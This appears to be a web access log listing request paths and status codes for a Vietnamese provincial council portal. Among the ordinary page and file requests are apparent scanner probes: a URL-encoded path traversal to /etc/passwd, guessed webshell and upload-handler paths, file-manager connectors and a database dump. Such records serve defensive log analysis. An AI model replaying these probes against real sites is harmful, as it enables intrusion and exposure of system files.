/sap/public/bc/ur/Login/assets/corbu/sap_logo.png,404
/wp-admin/dropdown.php,404
/x,404
/portal/Photos/2021-10-17/5a5fe1f7d1fc4a4ddtg.jpg,200
/_layouts/styles/dlgframe.css,200
/ads.txt,404
/CookieAuth.dll,404
/homeaction.php,404
/portal/Pages/2021-10-31/Doan-dai-bieu-Quoc-hoi-tinh-dong-gop-y-kien-tai-ca0vp588.aspx,200
/hms/user-login.php,404
/wbm/plugins/wbm-legal-information/platform/pfcXXX/licenses.php,404
/audio/27921.mp3,404
"/view-resol-Nghi-quyet-so-1-NQ-TTHDND-ngay-16-6-2016-ve-viec-xac-nhan-ket-qua-bau-cu-chu-tich-HDND-tinh-khoa-XVIII,-nhiem-vu-2016-2021-173.html",400
/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/servlets/OmaDsServlet,404
/hoidongnhandan/1231/29459/42085/Hoi-dong-nhan-dan-huyen-Giao-Thuy/AttachFiles/NQ+20+quyet+dinh+dieu+chinh+c.truong+dau+tu+DA+phat+trien+ha+tang+khung+CP+dien+tu+tinh+ND100620201154.pdf,404
/hoidongnhandan/1231/29459/39413/Ban-Kinh-te---Ngan-sach-HDND-tinh/AttachFiles/thuong-truc.aspx,404
/wp-content/plugins/quiz-master-next/README.md,404
/AttachFiles/29.+Cac+BC+cua+Ban+Phap+che060620180941.pdf,200
/portal/Pages/default.aspx/api/Upload,200
/portal/Pages/2023-12-18/Ban-Thuong-vu-Tinh-uy-thao-luan-cho-y-kien-vao-cac8sjbqv.aspx,200
/css/form/jquery.tagsinput.css,200
/portal/VanBan/2023-04/cf21e26dd7f9fc8dThông+báo+kết+quả+kỳ+họp+thứ+10+HĐND+tỉnh.pdf,200
/AttachFiles/ban+pc.báo+cáo+thẩm+tra+(chính+thức)+(1)030620180636.doc,200
"/AttachFiles/23.+Đ.án+thu+phí+cấp+GCN+KD+cơ+sở,+CLB+về+thể+thao100620201138.pdf",200
/scripts/setup.php,404
/portal/Photos/2024-03-13/cfd864bb1d4874fdscreenshot-1710296531035.png,200
/van-phong-detail.aspx,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/console/login/LoginForm.jsp,404
/AttachFiles/23.+BC+cong+tac+nam+2019+cua+Cuc+thi+hanh+an+100620201112.pdf,200
/index.php,404
/hoidongnhandan/1231/29461/39412/95503/Tin-tuc---Hoat-dong/Hoi-nghi-Thuong-truc-HDND-cac-tinh--thanh-pho-Dong-bang-song-Hong-va-duyen-hai-Bac-Bo-tai-Ha-Noi.aspx,404
/backend/elfinder/elfinder-cke.html,404
/css/form/bootstrap.datepicker.css,200
/portal/admin/tai-nguyen/js/van-ban.js,200
/portal/Photos/2023-07/3faea2dd230b0fed357172196e3abd64e42b.jpg,200
/wp-admin/admin-post.php,404
"/site/thuvientailieudientuvietnam/AttachFiles/NQ+52+giao+bien+che+cong+chuc+QLHCNN+va+phe+duyet+tong+so+nguoi+lam+viec+trong+don+vi+SNCL,+to+chuc+hoi,+giao+vien+mam+non+HD151220200249.pdf",400
/audio/27842.mp3,404
/CTCWebService/CTCWebServiceBean/ConfigServlet,404
/AttachFiles/34.1.+BC+cua+UBND+tinh+ve+ket+qua+thuc+hien+sau+GSCD+cua+TT+HDND+tinh+ve+tinh+hinh+hoat+dong+cua+cong+ty+MTV+khai+thac+cong+trinh+thuy+loi031220200923.pdf,200
/STATE_ID/123/agentLogUploader,404
/apple-touch-icon-152x152-precomposed.png,404
/css/form/jquery.jgrowl.css,200
/portal/Pages/2022-11-21/Hoi-nghi-lan-thu-17-Ban-Chap-hanh-Dang-bo-tinh-kholeykot.aspx,200
/OASREST/v2/authenticate,404
/hoidongnhandan/1231/29459/40963/Chuong-trinh-hanh-dong-DB-HDND/AttachFiles/NQ+83+chap+thuan+dieu+chinh+thoi+gian+thuc+hien+du+an+xay+dung+kho+luu+tru+chuyen+dung+tinh151220200310.pdf,404
/portal/Pages/default.aspx/ceshi.asp,200
/ztp/cgi-bin/handler,404
/dms/admin/accounts/payment_history.php,404
/AttachFiles/NQ+80+chap+thuan+dieu+chinh+du+an+xay+dung+KDT+moi+phia+Nam+song+Dao151220200308.pdf,200
/xmlrpc,404
/wp-content/style.php,404
/AttachFiles/Báo+cáo+thẩm+tra+(chính+thức).doc130320180939.docx,304
/portal/pages/Tin-hoat-dong-HDND-cac-huyen-TP.aspx,200
/portal/Pages/2021-10-19/Giam-sat-viec-thuc-hien-chinh-sach-phap-luat-ve-trptz6ln.aspx,200
/wp-content/plugins/documentor-lite/core/js/documentor.js,404
/_layouts/tandan.portal/jslibs/jquery.js,200
/wp-includes/style.php,404
/admin.html,404
/portal/Pages/Ban-Phap-Che.aspx,200
/zimbraAdmin/0MVzAe6pgwe5go1D.jsp,404
/portal/LinkImage/ed4b073d7df5b2fdda+cam.jpg,200
/portal/Photos/2024-03/bac4b5956eafe91dqh_20240325212544.png,200
/portal/VanBan/2023-08/dbfbb64637e5f52dQuyết+định+triệu+tập+kỳ+họp+thứ+13+HĐND+tỉnh.pdf,200
/audio/27611.mp3,404
/portal/ImageAds/c7d149d0d51cdccdNghiQuyetDB.jpg,200
/api/graphql,404
/pme/media/,404
/_layouts/1033/core.js,200
/include/makecvs.php,404
/portal/js/font-zoom.js,200
/hoidongnhandan/1231/29461/39412/99593/Tin-tuc---Hoat-dong/Dang-huong-tuong-niem-111-nam-Ngay-sinh-Tong-Bi-thu-Truong-Chinh.aspx,404
/wp-content/themes/applica/400.php,404
/portal/Photos/2021-10-19/5d98965349446d1dvhxh1.jpg,200
/portal/Photos/2022-08-19/eeddedd3e45c260dimages1343578_Untitled_1.jpg,200
/webmail/,404
"/portal/VanBan/2021-11/2d283ae22207240d26.+Sap+xep,+sap+nhap+thon+(xom),+to+dan+pho+tren+dia+ban+tinh,+giai+doan+2021_2022.pdf",200
/portal/Pages/2023-8-25/Dau-an-nua-nhiem-ky-Hoi-dong-nhan-dan-cac-capccipc8.aspx,200
/portal/Pages/default.aspx/tools/Uploadhandler/Uploadify.ashx,200
/portal/pages/Tin-hoat-dong-Van-phong-Doan-DBQH-va-HDND.aspx,200
/wp-content/plugins/Cache/Cache.php,404
/AttachFiles/27.+BC+GSCD+cua+TT+HDND+tỉnh+ve+t.+hinh+h.dong+cua+cac+c.so+GDPTCL+tren+dia+ban+tinh100620201113.pdf,304
"/AttachFiles/4.+Sap+xep+don+vi+hanh+chinh+cap+huyen,+xã+giai+doan+2019-2021100620201100.pdf",206
/cgi-bin/export-cgi,404
/portal/Pages/2023-11-14/Dai-bieu-HDND-tinh-tiep-tuc-chuong-trinh-tiep-xuc-ncs8qk.aspx,200
/portal/admin/tai-nguyen/js/album.js,200
/portal/admin/default.aspx,200
/css/form/style.css,200
/ebook/bookPerPub.php,404
/portal/Photos/2023-12-25/12d7ea91528f3f0d2a.jpg,200
/card_scan.php,404
/audio/27926.mp3,404
/portal/Photos/2022-10-28/d419b4d68d61d4fdPXL_20221026_082107133.jpg,200
/portal/Photos/2022-11/79a3ed92da2316fdimages1345836_Untitled_1.jpg,200
/hoidongnhandan/1231/29459/39511/lich-cong-tac/tin-tuc-van-hoa.aspx,404
/wp-includes/js/tinymce/skins/lightgray/img/index.php,404
/_layouts/images/wpmenuarrow.png,200
/AttachFiles/kế+hoạch+giám+sát+chuyên+đề030620180608.doc,200
/portal/Photos/2022-06-30/8e0c0acbfd7189bdIMG_1656560362096_1656575143740.jpg,200
/portal/Pages/2023-8-22/Tuyen-duong-khen-thuong-con-CBCC-NLD-ve-thanh-tichdyk1i7.aspx,200
/portal/Pages/2021-3-25/Tao-dieu-kien-de-ung-cu-vien-lang-nghe-y-kien-cu-td2xfqc.aspx,200
/nghi-quyet-detail.aspx,404
/portal/_themes/Portal_red/jquery-ui/jquery-ui.min.css,200
/AttachFiles/nghị+quyết+24+của+TT+HĐND120620200831.pdf,200
/portal/VanBan/2021-12/86c6414a686418cd8.+60.+NQ+chap+thuan+du+an+phai+thu+hoi+dat+2020.pdf,200
/functionRouter,404
/hoidongnhandan/1231/29461/40932/80173/Van-ban-tra-loi-y-kien---kien-nghi-cu-tri/Bao-cao-so-164-BC-SNN-ngay-01-7-2016-cua-So-Nong-nghiep-va-Phat-trien-nong-thon-tra-loi-y-kien-kien-nghi-cua-cu-tri-tai-ky-hop-thu-16--HDND-tinh-khoa-XVII.aspx,403
/portal/LinkImage/bdd19138618d6dcdGopYVB-r.jpg,200
/_layouts/1033/styles/Themable/layouts.css,200
/portal/Photos/2024-03/a90d36d104e3d40d1_20240318180913.png,200
/db_dump.sql,404
/wp-content/uploads/cfom_files/2egzrb5ymxugydiur6jfpb9l56y.php,404
/wp-content/themes/universal-news/www.php,404
/portal/Pages/2023-10-12/Hoi-nghi-lan-thu-24-Ban-Chap-hanh-Dang-bo-tinh-khou5krs7.aspx,200
/portal/Photos/2024-01/_t/e46c3d0094bfd45d1_jpg.jpg,200
/geoserver/wms,404
/vendor/htmlawed/htmlawed/htmLawedTest.php,404
/js/jquery_file_upload/server/php/,404
/,302
/portal/Pages/Thuong-truc-HDND-tinh.aspx,200
/_layouts/tandan/img/no-avatar.jpg,200
/portal/pages/van-ban/https:/namdinh.gov.vn/portal/pages/van-ban/default.aspx,400
/audio/27879.mp3,404
/portal/_themes/Portal_red/img/chuoi.png,200
/_forms/default.aspx,200
/portal/VanBan/2021-11/28456a60436d222d34.2.+BC+ket+qua+giam+sat+chuyen+de+viec+t.hien+CSPL+ve+tro+giup+xã+hoi+tu+nam+2019+den+nay+(cua+Ban+VHXH).pdf,304
/Side.php,404
/portal/Pages/Doan-DBQH-tinh.aspx,200
/portal/Photos/2021-10-17/4a1a9626207f4dadbtk.jpg,200
/img/layouts/logo.png,200
/css/form/tandan.datatables.css,200
/portal/js/portal.app.js,200
/href='/tai-lieu-detail.aspx,404
/portal/_res/css/responsive.css,200
/hoidongnhandan/1231/29459/39471/so-do-site/ban-phap-che.aspx,404
/audio/27471.mp3,404
/AttachFiles/33.+BC+Ctác+ANTT+của+CA100620201140.pdf,304
/admin/dashboard.php,404
/_layouts/images/errorIcon.png,200
/van-ban-view.aspx,404
"/AttachFiles/30.+B.cao+phong,+chong+toi+pham+va+vi+pham+phap+luat+6+thang+dau+nam+cua+UBND+tinh140720210818.pdf",304
/portal/Pages/2021-10-13/Phong-Cong-tac-Hoi-dong-nhan-dan0h5603.aspx,200
/js/layouts/jquery-1.8.3.min.js,200
/jira/secure/BrowseProject.jspa,404
/alfa-rex.php7,404
/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php,404
/hoidongnhandan/1231/29459/39415/Ban-Phap-che-HDND-tinh/tai-lieu-detail.aspx,404
/AttachFiles/9.+Bao+cao+tham+tra+cua+Ban+KTNS220420210941.pdf,200
/actuator/gateway/routes/2eGZrkSZLx5hTKDyLRLIcyDsZ4b,302
/hoidongnhandan/1231/29459/39541/Nghien-cuu---Trao-doi/,404
"/hoidongnhandan/1231/29459/39413/Ban-Kinh-te---Ngan-sach-HDND-tinh/AttachFiles/NQ+62+thong+qua+cap+nhat+thay+doi+ve+quy+mo,+dia+diem+va+so+luong+cong+trinh,+du+an+dat+quoc+phong+trong+dieu+chinh+QH+SDD151220200257.pdf",400
/AttachFiles/07.+NQ+muc+chi+va+thoi+gian+huong+ho+tro+phuc+vu+cong+tac+bai+cu+DBQH+va+DB+HDND+cac+cap+nhiem+ky+2021-2026220320211007.pdf,304
"/portal/VanBan/2024-03/4f070a03d7118e7dNghị+quyết+kỳ+họp+16+HĐND+tỉnh+khóa+XIX,+NK+2021-2026.rar",200
/portal/Photos/2023-01/37ae89186d3d23ddmt4.jpg,200
/src/redirect.php,404
/portal/Pages/2023-9-28/Doan-dai-bieu-Quoc-hoi-tinh-tiep-xuc-cu-tri-truoc-shazz3.aspx,200
/portal/_res/css/img/ic-title.png,200
/portal/Photos/2023-01-19/d13d4ec91cf0dacdIMG_2383.jpg,200
/meaweb/os/mxperson,404
/portal/images/icon.gif,200
/portal/Pages/2021-10-13/Lanh-dao-Van-phong-Doan-DBQH-va-HDND-tinh-Nam-Dinha10e1d.aspx,200
/audio/27494.mp3,404
/portal/Photos/2023-11/32d9051192338a6d1_20231125143917.jpg,200
/AttachFiles/NGHỊ+QUYẾT+28+CỦA+TT+HĐND120620200751.pdf,200
/portal/VanBan/2021-11/78840cf0add4f07d32.2.1.+Phu+luc+kem+theo+BC+GSCD+cua+Ban+KTNS+(PL+01).pdf,200
/wp-content/plugins/canto/includes/lib/get.php,404
/userfiles/file/TaiLieuTXCT+Ky+hop+6/AttachFiles/8-+NQ+76+ve+phi+thu+vien120620200950.doc,404
/api/scrape/kube-system,404
/checkValid,404
/_layouts/inplview.js,200
/js/form/bbq.js,200
/portal/Photos/2024-03-25/6ad777a1dd1d55ad3.jpg,200
/van-ban-thuong-truc.aspx,404
/assets/elFinder/elfinder.html,404
/dai-bieu-detail.aspx,404
/portal/Pages/default.aspx/Content/Uploadify,200
/AttachFiles/8.+BC+c.tac+nam+2018+cua+Cuc+THA011220181004.pdf,200
/portal/Photos/2023-05/a858a3cff78b889danh1_20230511175107.jpg,200
/portal/Pages/default.aspx/up.ashx,200
/portal/Photos/2023-02/dca5e5850d96807d1_20230221105815.png,200
/js/layouts/tandan.exporter.js,200
/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd#foo/development,400
/ajax/openvpn/del_ovpncfg.php,404
/public/formatter.jsp,404
/portal/_res/fonts/RobotoCondensed-Regular.ttf,200
/advanced_component_system/index.php,404
/wp-content/plugins/easy-wp-smtp/,404
/AttachFiles/BAO+CAO+tham+tra+trinh+tai+ky+hop+thu+4+cua+Ban+KT-NS+(chinh+thuc)+(1)130320180930.doc,200
/portal/Pages/2024-2-6/Van-hien-Nam-Dinh--Dong-rieng-giua-nguon-chung-zl5det.aspx,200
"/AttachFiles/NQ+37+nang+cap+ha+tang+vung+nuoi+trong+thuy+san+xa+Bach+Long,+h,+Giao+Thuy100620201159.pdf",200
/portal/Photos/2023-05/bac64f494c129d6d1a.jpg,200
/AttachFiles/3.+BC+ket+qua+GSCD+cua+TT+HDND+tinh051220180835.pdf,200
/accounts/login/,404
/tin-tuc-detail.aspx,404
"/AttachFiles/10.+Bao+cao+ket+qua+GSCD+cua+Thuong+truc+HDND+tinh+ve+su+dung+kinh+phi+tu+tien+su+dung+dat,+tien+thue+dat+co+cong+tac+do+dac,+d.ky+dat+dai031220200843.pdf",200
/searchblox/servlet/FileServlet,404
/portal/admin/tai-nguyen/van-ban.aspx,200
/plugin,404
/AttachFiles/28.2.+BC+GS+chuyen+de+ky+7+Ban+Phap+che011220181047.pdf,304
/css/form/TDForm.css,200
/portal/Pages/2021-10-13/8a7z6t.aspx,200
"/hoidongnhandan/1231/29459/40963/Chuong-trinh-hanh-dong-DB-HDND/AttachFiles/NQ+84+chap+thuan+dieu+chinh+d.an+xay+dung+KDT+thi+tran+My+Loc,+huyen+My+Loc151220200311.pdf",404
/portal/pages/Tin-tuc-su-kien.aspx,200
/portal/VanBan/2021-11/d2d94b42e360034d32.2.+BC+GSCĐ+thuc+hien+chuong+trinh+moi+xa+mot+san+pham+OCOP+cua+Ban+KTNS.pdf,200
/ext-js/index.html,404
/hoidongnhandan/1231/29459/39471/so-do-site/nghi-quyet-detail.aspx,404
/wp-login.php,404
/portal/Pages/default.aspx/Content/Uploadhandler,200
/AttachFiles/bc+kien+nghi+cu+tri+26-10030620180620.doc,200
/AttachFiles/1.+BC+nam+2018+cua+UBMTTQ+t_nh011220180625.pdf,200
/_layouts/tandan.portal/weather/img/128/03d.png,200
/tin-tuc-van-phong-detail.aspx,404
/ajaxPages/writeBrowseFilePathAjax.php,404
"/AttachFiles/19.+QĐ+mức+chi+công+tác+phí,+HN040620180828.pdf",200
/portal/_res/img/bg-title-2.png,200
/users/sign_in,404
/portal/Pages/default.aspx/api/files.ashx,200
/portal/Photos/2024-03-25/906691df8612c55d1.jpg,200
/hoidongnhandan/1231/29459/42094/Tin-tuc---Su-kien/AttachFiles/7.+NQ+ve+chap+thuan+dieu+chinh+thoi+gian+thuc+hien+cac+du+an+dau+tu+cong260420210411.pdf,404
/portal/Pages/Dai-bieu-HDND-tinh.aspx,200
/OA_HTML/BneViewerXMLService,404
/api/settings/values,404
/awstats/awredir.pl,415
/wp-admin/admin.php,404
/portal/Pages/van-ban/https:/hdnd.namdinh.gov.vn/_forms/td-login.aspx,400
/AttachFiles/Quy%E1%BA%BFt%20%C4%91%E1%BB%8Bnh%20tri%E1%BB%87u%20t%E1%BA%ADp%20k%E1%BB%B3%20h%E1%BB%8Dp%20th%E1%BB%A9%2012-k%E1%BB%B3%20h%E1%BB%8Dp%20b%E1%BA%A5t%20th%C6%B0%E1%BB%9Dng191220190312.pdf,400
/portal/Pages/default.aspx/files.asp,200
/portal/Pages/default.aspx/tools/Uploadify/Uploadify.ashx,200
/plugins/system/cdscriptegrator/libraries/highslide/js/jsloader.php,404
/portal/ImageAds/8d03f4fa9d04470dxanh+com+999.jpg,200
/assets/data/usrimg/2ecvi8bn9bwky9ugwyeugaloge0.php,404
/session/create,404
/catalog-portal/ui/oauth/verify,404
